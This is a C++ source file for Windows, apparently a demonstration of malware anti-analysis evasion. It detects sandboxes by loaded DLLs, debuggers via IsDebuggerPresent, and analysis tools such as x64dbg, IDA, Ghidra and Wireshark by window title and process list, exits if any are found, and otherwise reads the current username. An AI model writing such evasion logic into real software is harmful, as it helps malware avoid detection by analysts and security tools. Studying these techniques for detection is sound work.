#include <iostream>
#include <Windows.h>
#include <string>
#include <vector>
#include <tlhelp32.h>

//This programs is educational purpose and security research only. Don't use for malicious activities
void UserEnum();
std::string isAnalystToolRunning();

bool isSandbox() {
	if (GetModuleHandle("SbieDll.dll") != NULL) return TRUE;
	if (GetModuleHandle("apihook") != NULL ) return TRUE;
	//We can add more checks	
	return FALSE;
	}

std::vector<std::wstring> suspiciousTitles = {
    L"OllyDbg", L"x64dbg", L"IDA", L"Immunity Debugger", L"WinDbg", L"Wireshark"
};

BOOL CALLBACK EnumWindowsCallback(HWND hwnd, LPARAM lParam) {
    wchar_t title[256];
    GetWindowTextW(hwnd, title, sizeof(title) / sizeof(wchar_t));

    for (const auto& suspect : suspiciousTitles) {
        if (wcsstr(title, suspect.c_str())) {
            std::wcout << L"[!] Suspicious window(s) found: " << title << std::endl;
			std::wcout << L"[!] Malware process will stop now!" << std::endl;
			ExitProcess(0);
        }
    }
    return TRUE;  // continue enumeration
}

int main() {
	
	std::cout << " " << std::endl;
	std::cout << "[::] Malware is looking for safe environment this System [::]" << std::endl;
	std::cout << " " << std::endl;
	
	std::string detectedTool = isAnalystToolRunning();
	
	if(!detectedTool.empty()) {
		std::cout << "[!] Analyst tool detected: " << detectedTool << std::endl;
        std::cout << "[!] Terminating process for security." << std::endl;
		ExitProcess(0);
	}
	
	if(isSandbox()) {
		std::cout << "[!] Environment detected: SandBox environment. Process has been suspended!" << std::endl;
		ExitProcess(0);
	} else {
		std::cout << "[+] Environment detected: Real environment" << std::endl;
	}
	
	if (IsDebuggerPresent()) {
        std::cout << "[!] Debugger detected. Exiting..." << std::endl;
        ExitProcess(0);
		return 1;
    } else {
        std::cout << "[+] No debugger detected: Continuing execution." << std::endl;
		EnumWindows(EnumWindowsCallback, 0);
		
		std::cout << " " << std::endl;
		std::cout << "-----------------ENUMARATE-----------------" << std::endl;
		UserEnum(); //Function call for UserEnum
		std::cout << "-------------------------------------------" << std::endl;
	}

	return 0;
}

void UserEnum() {
	WCHAR username[256];
	DWORD size = sizeof(username) / sizeof(WCHAR);
	
	if(GetUserNameW(username, &size)) {
		std::wcout << L"[!] Current user: " << username << std::endl;
	} else {
		std::wcerr << L"[!] Username enumaration failed! error: " << GetLastError() << std::endl;
	}
}

std::string isAnalystToolRunning() {
	std::vector<std::string> blacklist = {
		"wireshark.exe", "ida64.exe", "x64dbg.exe", 
        "processhacker.exe", "ghidra.exe", "x32dbg.exe"
	};
	
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);
	
	if(hSnap == INVALID_HANDLE_VALUE) return "";
	
	if(Process32First(hSnap, &pe32)) {
		do {
			for (const std::string& tool : blacklist ) {
				if(_stricmp(pe32.szExeFile, tool.c_str()) == 0) {
					std::string foundTool = pe32.szExeFile; 
					CloseHandle(hSnap);
					return foundTool;
				}
			}
		} while (Process32Next(hSnap, &pe32));
		
	}
	CloseHandle(hSnap);
	return "";
}